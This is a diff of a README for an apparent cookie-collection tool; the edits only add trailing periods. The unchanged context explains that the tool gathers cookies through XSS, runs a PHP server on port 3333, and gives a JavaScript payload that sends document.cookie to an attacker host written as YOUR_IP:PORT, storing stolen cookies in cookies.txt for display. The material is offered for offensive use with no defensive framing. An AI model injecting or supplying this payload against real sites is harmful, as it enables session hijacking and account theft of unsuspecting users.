@@ -5,7 +5,7 @@ A tool to collect cookies and show them in a web page.
 
 ## Documentation 📖
 
-This tool is to collect cookies via logs with XSS
+This tool is to collect cookies via logs with XSS.
 
 ### Install requiriments 🔭
 
@@ -17,7 +17,7 @@ sudo apt install php8.3
 
 #### Run the server 🏃
 
-To run the server you need to be in the main directory of the project to then run the server with `PHP`
+To run the server you need to be in the main directory of the project to then run the server with `PHP`.
 
 ~~~bash
 php -S localhost:3333
@@ -32,7 +32,7 @@ You need to know how to do XSS Attacks to use this tool in a correct way, you ha
 new Image().src='http://YOUR_IP:PORT/devil/devil.php?i='+document.cookie;
 ~~~
 
-Then you will have the cookie in the file `cookies.txt` and it will be displayed in the web page
+Then you will have the cookie in the file `cookies.txt` and it will be displayed in the web page.
 
 
 ### cleaning cookies 🗑️
